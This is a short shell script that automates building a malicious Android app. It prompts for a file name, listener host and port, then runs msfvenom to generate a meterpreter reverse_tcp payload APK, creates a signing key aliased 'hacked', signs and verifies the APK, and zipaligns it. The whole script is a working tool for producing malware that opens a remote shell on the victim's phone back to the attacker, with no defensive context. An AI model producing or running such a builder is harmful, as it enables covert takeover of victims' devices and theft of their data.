##!/bin/sh
echo "input name for malicious APK (do NOT add .apk extension) "
read virus1
echo "input LHOST "
read LHOST1
echo "input LPORT "
read LPORT1
signed="_signed"
 
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST1 LPORT=$LPORT1 -o $virus1.apk
 
keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
 
sudo apt-get install default-jdk -y
 
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore $virus1.apk hacked
 
jarsigner -verify -verbose -certs $virus1.apk
 
sudo apt-get install zipalign -y
 
zipalign -v 4 $virus1.apk $virus1$signed.apk
